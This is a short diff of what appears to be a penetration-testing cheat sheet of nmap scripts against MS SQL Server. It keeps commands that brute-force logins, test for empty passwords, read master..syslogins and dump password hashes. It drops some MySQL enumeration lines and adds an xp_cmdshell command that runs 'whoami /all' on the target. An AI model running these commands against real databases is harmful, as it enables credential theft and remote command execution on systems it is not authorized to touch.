@@ -6,12 +6,5 @@ nmap --script ms-sql-brute --script-args userdb=/root/Desktop/Wordlist/common_us
 nmap --script ms-sql-empty-password <target>
 nmap --script ms-sql-query --script-args 'mssql.username=" ", mssql.password=" ", ms-sql-query.query="SELECT * FROM master..syslogins"' <target>
 nmap --script ms-sql-dump-hashes --script-args 'mssql.username=" ", mssql.password=" " ' <target>
-
-
-nmap --script mysql-databases
-nmap --script mysql-audit --script-args "mysql-audit.username='root', mysql-audit.password='', mysql-audit.filename=/usr/share/nmap/nselib/data/mysql-cis.audit" <target>
-
-nmap --script mysql-enum <target>
-
-
-nmap --script mysql-variables <target>
+nmap --script ms-sql-xp-cmdshell --script-args 'mssql.username=" ", mssql.password=" ", ms-sql-xp-cmdshell.cmd="whoami /all" ' <target>
+```
